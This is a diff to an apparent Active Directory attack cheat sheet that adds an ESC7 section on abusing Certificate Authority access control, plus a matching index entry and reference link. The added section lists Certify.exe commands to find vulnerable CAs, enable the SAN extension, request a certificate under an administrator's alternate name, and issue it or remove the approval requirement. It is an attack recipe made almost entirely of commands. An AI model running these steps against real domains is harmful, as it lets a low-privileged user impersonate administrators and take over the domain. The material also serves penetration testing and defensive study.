@@ -77,6 +77,7 @@
       - [ESC2 - Misconfigured Certificate Templates](#esc2---misconfigured-certificate-templates)
       - [ESC4 - Access Control Vulnerabilities](#esc4---access-control-vulnerabilities)
       * [ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 ](#esc6---editf_attributesubjectaltname2)
+      * [ESC7 - Vulnerable Certificate Authority Access Control](#esc7---vulnerable-certificate-authority-access-control)
       - [ESC8 - AD CS Relay Attack](#esc8---ad-cs-relay-attack)
     - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
@@ -2278,6 +2279,30 @@ Mitigation:
 * Remove the flag : `certutil.exe -config "CA01.domain.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2`
 
 
+#### ESC7 - Vulnerable Certificate Authority Access Control
+
+Exploitation:
+* Detect CAs that allow low privileged users the ManageCA permission
+    ```ps1
+    Certify.exe find /vulnerable
+    ```
+* Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)
+    ```ps1
+    Certify.exe setconfig /enablesan /restart
+    ```
+* Request the certificate with the desired SAN.
+    ```ps1
+    Certify.exe request /template:User /altname:super.adm
+    ```
+* Grant approval if required or disable the approval requirement
+    ```ps1
+    # Grant
+    Certify.exe issue /id:[REQUEST ID]
+    # Disable
+    Certify.exe setconfig /removeapproval /restart
+    ```
+
+
 #### ESC8 - AD CS Relay Attack
 
 > An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.
@@ -3468,3 +3493,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
 * [ADCS: Playing with ESC4 - Matthew Creel](https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4)
 * [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
+* [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
